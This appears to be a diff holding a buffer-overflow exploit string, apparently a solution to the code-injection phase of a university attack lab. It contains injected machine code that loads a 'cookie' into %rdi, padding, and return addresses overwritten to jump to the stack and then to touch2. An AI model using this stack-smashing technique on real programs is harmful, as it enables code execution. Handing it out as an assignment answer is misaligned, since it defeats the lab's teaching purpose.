@@ -1,0 +1,9 @@
+48 c7 c7 14 13 e2 16 c3 /* Address of instruction to move the cookie to %rdi, c3 returns. */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+d8 8e 65 55 00 00 00 00 /* RUNS FIRST: will call the address of the first line */
+a4 12 40 00 00 00 00 00 /* Calls touch2 */
